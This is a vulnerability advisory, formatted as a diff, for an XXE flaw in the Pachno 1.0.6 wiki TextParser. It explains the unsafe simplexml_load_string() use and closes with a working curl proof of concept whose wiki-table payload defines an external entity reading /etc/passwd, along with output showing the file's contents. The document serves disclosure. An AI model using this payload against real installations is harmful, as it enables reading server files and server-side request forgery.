@@ -1,0 +1,54 @@
+
+Pachno 1.0.6 Wiki TextParser XXE Vulnerability
+
+
+Vendor: Daniel André Eikeland
+Product web page: https://github.com/pachno/pachno
+Affected version: 1.0.6
+
+Summary: Pachno is an open-source collaboration platform (formerly known as The Bug Genie)
+designed for team project management, issue tracking, and documentation. It offers a module-based,
+customizable environment for software development and team workflows, distributed under the
+Mozilla Public License.
+
+Desc: Input passed via wiki table syntax ({|..., |-..., |...||...) and allowed inline tags
+(<span>, <div>, <blockquote>, etc.) in issue descriptions, comments, and wiki articles is
+concatenated into XML strings and parsed by simplexml_load_string() in the TextParser helper
+without setting LIBXML_NONET or otherwise restricting entity resolution. On PHP installations
+linked against libxml2 < 2.9.0 (where external entity loading is enabled by default), this
+can be exploited to read arbitrary local files via the file:// scheme, perform server-side
+request forgery against internal services via the http:// scheme, and exfiltrate the response
+body through reflected XML attribute values. Successful exploitation requires an authenticated
+session with permission to create or edit content that is rendered through the wiki parser.
+On PHP 7.4+ installations with libxml2 >= 2.9.0 the vulnerability is mitigated by the underlying
+library but the unsafe code pattern remains.
+
+Tested on: GNU/Linux
+           Apache2
+           PHP/7.4
+           MySQL/5.7 (MariaDB)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5984
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5984
+
+
+06.04.2026
+
+--
+
+
+$ curl -v -b cookies.txt -X POST "http://127.0.0.1/docs/r/4/edit" \
+  --data-urlencode 'article_content={|<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> class="wikitable &xxe;" \
+|-\
+| ZSL\
+|}'
+
+
+$ curl -s -b cookies.txt "http://127.0.0.1/docs/4/article-name" | grep -o 'class="wikitable [^"]*"'
+root:x:0:0:root:/root:/bin/bash
+...
